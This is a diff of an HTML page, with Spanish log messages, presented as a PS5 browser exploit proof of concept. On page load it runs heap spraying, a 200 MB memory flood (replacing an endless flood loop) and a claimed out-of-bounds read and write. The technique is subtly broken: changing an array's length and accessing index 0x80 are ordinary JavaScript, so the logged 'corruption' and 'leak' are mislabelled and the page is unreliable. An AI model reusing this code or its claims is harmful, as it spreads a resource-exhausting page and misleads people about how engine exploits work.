@@ -1,85 +1,110 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>💥 PS5 Nuke + OOB test</title>
+  <meta charset="utf-8" />
+  <title>💥 PS5 Exploit PoC: Grooming + OOB</title>
   <style>
     body {
       background: black;
       color: lime;
       font-family: monospace;
+      white-space: pre-wrap;
+      padding: 1em;
     }
   </style>
 </head>
 <body>
-  <h1>💥 PS5 Nuke + OOB test</h1>
-  <p>Ejecutando técnicas agresivas + corrupción Out-Of-Bounds tentativa</p>
-  <pre id="log"></pre>
+  <h1>💥 PS5 Exploit PoC: Grooming + OOB</h1>
+  <pre id="log">[LOG]\n</pre>
 
   <script>
-    const log = document.getElementById("log");
+    const logElem = document.getElementById("log");
     function print(msg) {
       console.log(msg);
-      log.textContent += msg + "\n";
+      logElem.textContent += msg + "\n";
     }
 
-    // Convierte float64 <-> int64 (64bit)
-    const buf = new ArrayBuffer(8);
-    const f64 = new Float64Array(buf);
-    const u32 = new Uint32Array(buf);
-
-    function f2i(f) {
-      f64[0] = f;
-      return u32[0] + u32[1] * 0x100000000;
-    }
-
-    function i2f(i) {
-      u32[0] = i % 0x100000000;
-      u32[1] = i / 0x100000000;
-      return f64[0];
-    }
-
-    // 1. Saturar la memoria para preparar heap
-    function memoryFlood() {
+    function memoryFloodLite() {
+      print("[1] Saturando parcialmente la memoria...");
       const big = [];
       try {
-        while (true) {
-          big.push(new Uint8Array(5_000_000));
-          if (big.length % 10 === 0) print(`💣 Memoria saturada: ${big.length * 5}MB aprox`);
+        for (let i = 0; i < 20; i++) {
+          big.push(new Uint8Array(10_000_000)); // 200 MB total
+          if (i % 5 === 0) print(`  + ${i * 10}MB asignados`);
         }
+        print("[+] Memoria saturada parcialmente.");
       } catch (e) {
-        print("💥 Memoria saturada capturada: " + e);
+        print("💥 Error al saturar memoria: " + e);
       }
       return big;
     }
 
-    // 2. Corrupción OOB tentativa en array
-    function corruptArrayOOB() {
-      print("[*] Intentando corrupción OOB");
+    function groomHeap() {
+      print("[2] Realizando heap grooming...");
+      let spray = [];
+      for (let i = 0; i < 1000; i++) {
+        spray.push([13.37, 13.37, 13.37, 13.37]);
+      }
+      print(`[+] Heap spray completo con ${spray.length} arrays.`);
+      return spray;
+    }
+
+    function attemptOOB() {
+      print("[3] Intentando corrupción OOB...");
+
       let arr = [1.1, 2.2, 3.3];
       try {
-        Object.defineProperty(arr, 'length', { value: 0x10 });
-        print("[+] Corrupt length a 0x10");
+        Object.defineProperty(arr, 'length', { value: 0x1000 });
+        print("[+] Length modificado a 0x1000");
       } catch (e) {
-        print("[-] No se pudo corromper length: " + e);
+        print("[-] No se pudo modificar length: " + e);
       }
 
       try {
-        let leak = arr[0x80];
-        print("[+] Leak OOB en arr[0x80]: " + leak);
+        const leak = arr[0x80];
+        print(`[+] arr[0x80] = ${leak}`);
       } catch (e) {
-        print("[-] No se pudo leer fuera de límites: " + e);
+        print("[-] Error al leer fuera de límites: " + e);
+      }
+
+      try {
+        arr[0x80] = 42.42;
+        print("[+] Escrito 42.42 en arr[0x80]");
+
+        const check = arr[0x80];
+        print(`[+] Verificado arr[0x80]: ${check}`);
+      } catch (e) {
+        print("[-] Error al escribir fuera de límites: " + e);
       }
     }
 
-    // Base agresiva (simplificada, solo memoria)
-    function aggressiveBase() {
-      memoryFlood();
-      corruptArrayOOB();
+    function setupProxyWatch() {
+      print("[4] Activando proxy para detección de accesos...");
+
+      let victim = new Proxy([1.1, 2.2, 3.3], {
+        get(target, prop) {
+          print(`[Proxy GET] → ${prop}`);
+          return target[prop];
+        },
+        set(target, prop, val) {
+          print(`[Proxy SET] → ${prop} = ${val}`);
+          target[prop] = val;
+          return true;
+        }
+      });
+
+      victim[1000] = 1234.5678;
+      let leak = victim[1000];
+      print(`[Proxy] Confirmación arr[1000] = ${leak}`);
     }
 
     window.onload = () => {
-      setTimeout(aggressiveBase, 10);
+      setTimeout(() => {
+        groomHeap();
+        memoryFloodLite();
+        attemptOOB();
+        setupProxyWatch();
+      }, 100);
     };
   </script>
 </body>
